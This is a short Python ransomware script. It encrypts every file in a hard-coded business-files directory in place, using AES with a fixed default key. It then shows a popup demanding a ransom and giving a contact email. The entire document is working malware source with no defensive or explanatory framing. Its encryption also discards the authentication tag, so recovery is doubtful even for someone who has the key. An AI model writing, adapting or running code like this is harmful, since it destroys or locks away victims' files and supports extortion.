import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import tkinter as tk
from tkinter import messagebox

# Default encryption key
DEFAULT_KEY = "anonymoushere"

def encrypt_file(file_path, key=DEFAULT_KEY):
    with open(file_path, 'rb') as file:
        file_data = file.read()

    # Ensure the key is 32 bytes (AES-256)
    key = key.ljust(32)[:32].encode()
    cipher = AES.new(key, AES.MODE_EAX)
    nonce = cipher.nonce
    ciphertext, tag = cipher.encrypt_and_digest(file_data)

    with open(file_path, 'wb') as file:
        file.write(nonce + ciphertext)

    print(f"Encrypted {file_path}")

def encrypt_directory(directory, key=DEFAULT_KEY):
    for filename in os.listdir(directory):
        file_path = os.path.join(directory, filename)
        if os.path.isfile(file_path):
            encrypt_file(file_path, key)

def show_popup_message():
    root = tk.Tk()
    root.withdraw()  # Hide the root window
    messagebox.showinfo(
        "Encryption Notice",
        "Oops! Your files are locked. Pay the ransom to recover them. Contact us at anonymoushere@gmail.com"
    )
    root.destroy()

if __name__ == "__main__":
    # Path to the directory containing files to encrypt
    directory = "/home/naveena/Businessfiles"
    encrypt_directory(directory)
    show_popup_message()

